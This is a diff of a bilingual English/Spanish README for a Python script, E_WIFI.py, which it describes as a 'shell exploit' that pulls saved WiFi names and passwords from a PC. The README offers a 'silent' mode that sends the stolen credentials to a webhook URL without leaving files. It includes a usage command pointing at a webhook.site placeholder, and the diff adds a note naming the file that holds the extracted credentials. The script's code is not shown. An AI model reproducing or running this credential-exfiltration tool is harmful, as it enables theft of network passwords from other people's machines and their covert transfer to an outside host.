@@ -3,8 +3,11 @@
 you might need this requeriments
 Tal vez podrias necesitar estos requerimientos
 
+
 pip install click
+
 pip install elementpath
+
 pip install requests
 
 Script to extract WIFI passwords from a pc uploading it remotely (shell exploit) and send it to a url "silently"(webhook without leaving files 
@@ -46,7 +49,9 @@ Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 
 silent: Only webhook, no txt file
+
 python3 E_WIFI.py -u https://webhook.site/yoururl -o
 
 type --help for more detailed info
 
+PD: Extracciones.txt is the txt with the wifis credentials
